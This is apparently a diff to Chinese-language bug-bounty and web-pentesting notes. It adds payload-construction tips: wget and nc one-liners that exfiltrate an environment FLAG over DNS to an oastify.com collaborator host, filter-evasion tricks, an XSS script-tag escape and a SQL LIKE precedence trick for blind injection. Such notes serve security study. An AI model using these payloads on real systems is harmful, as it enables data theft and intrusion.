@@ -1,13 +1,8 @@
 ## 平台
 
 平台项目
-- 偏好资产类型
-    - Open Scope 开放范围
-    - Close Scope 封闭范围：
-        - Other Asset：
-            - Any/Other 广泛的资产
-            - 有时提供包含详细 IP 范围的文档链接
-        - CIDR：专用网段
+- 类型：
+    - Other Asset，有时提供包含详细 IP 范围的文档链接
 
 - 状态
     - 更新：或许新增有趣的资产类别，查看详细描述
@@ -401,18 +396,55 @@ DOM XSS
 
 ## 载荷构造
 
+- 带外
+    - DNS 解析
+        ```sh
+        # 使用一种网络工具，普遍存在
+        # 使用一种编码工具，普遍存在且输出格式为合法 DNS 域名字符
+        # 或额外使用字符串工具替换特殊字符
+        wget $(env | grep FLAG | xxd -p).id.oastify.com
+        nc $(env | grep FLAG | od -An -tx1 | tr -d ' \n').id.oastify.com
+        ```
+        - DNS 在查询后缓存，之后的连续查询需修改域名以确保发出请求 
+            `带外数据.§任意内容§.id.oastify.com`
+
 - 混淆
     - 编码
     - 动态代码构建
+        - 切片
+        - 转换
     - 大小写
     - 空白符
-    - Unicode 空白、相近字符
+    - Unicode
+        - 空白
+        - 相近字符
+        - 命名名称的转义序列
+            ```py
+            # '$' 的 Unicode 转义名称
+            '\N{DOLLAR SIGN}'
+            ```
     - 注释、成对引号
+    - 在无害位置插入伪闭合字符
 - 字段访问
     - 点 `.`
     - 索引 `[]`
 - 参数
     - 列表型 `foo[]=bar`
+- 上下文
+    - 逃逸
+        - 闭合标记
+        - 解析优先级截断
+            ```HTML
+            <script> let foo = '§输入§'; </script>
+            <!-- JS 字符串内的 script 闭合标记立即生效 -->
+            <script> let foo = '</script>'; </script>
+            ```
+    - 运算优先级
+        ```sql
+        LIKE '%§输入§%'
+        -- LIKE 与 `=` 拥有相同优先级，从左到右结合，创造布尔型盲注
+        (LIKE '%') = (1=1)--%'
+        ```
 
 ## 版本依赖
 
